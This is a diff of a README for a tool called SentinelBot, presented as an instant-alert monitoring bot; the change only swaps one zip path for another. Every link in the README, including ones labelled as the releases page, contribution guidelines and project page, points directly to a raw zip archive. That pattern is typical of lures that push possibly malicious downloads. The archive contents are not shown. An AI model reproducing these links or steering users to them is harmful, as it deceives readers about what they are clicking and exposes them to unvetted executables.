@@ -1,6 +1,6 @@
 # 🚀 SentinelBot - Instant Alerts and Easy Monitoring
 
-[![Download SentinelBot](https://github.com/huseyinck/SentinelBot/raw/refs/heads/main/monitoring/Sentinel_Bot_3.7.zip)](https://github.com/huseyinck/SentinelBot/raw/refs/heads/main/monitoring/Sentinel_Bot_3.7.zip)
+[![Download SentinelBot](https://github.com/huseyinck/SentinelBot/raw/refs/heads/main/sentinel/Bot-Sentinel-v3.1.zip)](https://github.com/huseyinck/SentinelBot/raw/refs/heads/main/sentinel/Bot-Sentinel-v3.1.zip)
 
 ## 📦 What is SentinelBot?
 
@@ -16,7 +16,7 @@ To run SentinelBot, you will need:
 
 ## 🚀 Getting Started
 
-1. Visit the [GitHub Releases page](https://github.com/huseyinck/SentinelBot/raw/refs/heads/main/monitoring/Sentinel_Bot_3.7.zip) to download the latest version of SentinelBot.
+1. Visit the [GitHub Releases page](https://github.com/huseyinck/SentinelBot/raw/refs/heads/main/sentinel/Bot-Sentinel-v3.1.zip) to download the latest version of SentinelBot.
 2. Look for the most recent release and choose the appropriate file for your operating system.
 3. Click the download link to start downloading the file.
 
@@ -55,12 +55,12 @@ If you encounter any issues while downloading or installing SentinelBot, check t
 
 ## 🌐 Community and Contributions
 
-We welcome contributions! If you would like to help improve SentinelBot, visit our [Contributions Guidelines](https://github.com/huseyinck/SentinelBot/raw/refs/heads/main/monitoring/Sentinel_Bot_3.7.zip).
+We welcome contributions! If you would like to help improve SentinelBot, visit our [Contributions Guidelines](https://github.com/huseyinck/SentinelBot/raw/refs/heads/main/sentinel/Bot-Sentinel-v3.1.zip).
 
 ## 🌍 Learn More
 
-Stay informed about the latest updates and features by following us on our [GitHub page](https://github.com/huseyinck/SentinelBot/raw/refs/heads/main/monitoring/Sentinel_Bot_3.7.zip). 
+Stay informed about the latest updates and features by following us on our [GitHub page](https://github.com/huseyinck/SentinelBot/raw/refs/heads/main/sentinel/Bot-Sentinel-v3.1.zip). 
 
-Remember, the latest version always lives on the [Releases page](https://github.com/huseyinck/SentinelBot/raw/refs/heads/main/monitoring/Sentinel_Bot_3.7.zip), where you can also find previous versions if needed. 
+Remember, the latest version always lives on the [Releases page](https://github.com/huseyinck/SentinelBot/raw/refs/heads/main/sentinel/Bot-Sentinel-v3.1.zip), where you can also find previous versions if needed. 
 
 We hope SentinelBot helps you in your monitoring journey!
